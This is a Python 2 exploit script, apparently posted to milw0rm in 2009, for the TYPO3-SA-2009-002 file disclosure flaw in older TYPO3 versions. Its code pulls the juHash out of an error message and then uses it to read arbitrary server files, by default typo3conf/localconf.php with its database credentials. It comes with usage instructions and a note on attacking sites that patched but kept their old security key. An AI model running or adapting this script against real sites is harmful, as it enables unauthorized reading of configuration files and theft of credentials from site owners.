#!/usr/bin/env python
#
# ------------------------------------------------------------------------------
# TYPO3-SA-2009-002 exploit by Lolek of TK53 <lolek1337 _at_ gmail.com>
# date: 2009/02/10
# vendor url: http://typo3.org
# vulnerable versions: TYPO3 < 4.2.6, TYPO3 < 4.1.10, TYPO3 < 4.0.12
# usage:
#       typo3-sa-2009-002.py <host> <file> (defaults to typo3conf/localconf.php)
#
# if people fixed their installations but did not update the typo3 security key
# you should be able to precompute the hashes if you previously got the security key.
#
# greetings to milw0rm, roflek

import urllib,re,sys

strip = re.compile(r'.*Calculated juHash, ([a-z0-9]+), did not.*')

def useme():
    print sys.argv[0], '<host> (with http://) <file> (defaults to typo3conf/localconf.php)'
    sys.exit(0)

def parsehash(host, f):
    file = urllib.urlencode({'jumpurl' : f, 'type' : 0, 'juSecure': 1, 'locationData' : '1:'})
    url = host + '/index.php?' + file
    try:
        s = urllib.urlopen(url)
        r = s.read()
    except Exception, e:
        print '[!] - ', str(e)
        return None

    tmp = strip.match(r)
    if tmp:
        return tmp.group(1)
    else:
        return None

def content(host, hash, f):
    file = urllib.urlencode({'jumpurl' : f, 'type' : 0, 'juSecure': 1, 'locationData' : '1:', 'juHash' : hash})
    url = host + '/index.php?' + file
    try:
        s = urllib.urlopen(url)
        print '[+] - content of:', f
        print s.read()
    except:
        print '[!] - FAIL'

def main():
    if len(sys.argv) < 2:
        useme()

    if len(sys.argv) < 3:
        file = 'typo3conf/localconf.php'
    else:
        file = sys.argv[2]

    print '[+] - TYPO3-SA-2009-002 exploit by Lolek of TK53'
    print '[+] - checking typo3 installation on...'

    hash = parsehash(sys.argv[1], file)

    if not hash:
        print '[!] - version already fixed or 42 went wrong while trying to get the hash'
        sys.exit(234)

    content(sys.argv[1], hash, file)


if __name__ == '__main__':
    main()

# milw0rm.com [2009-02-10]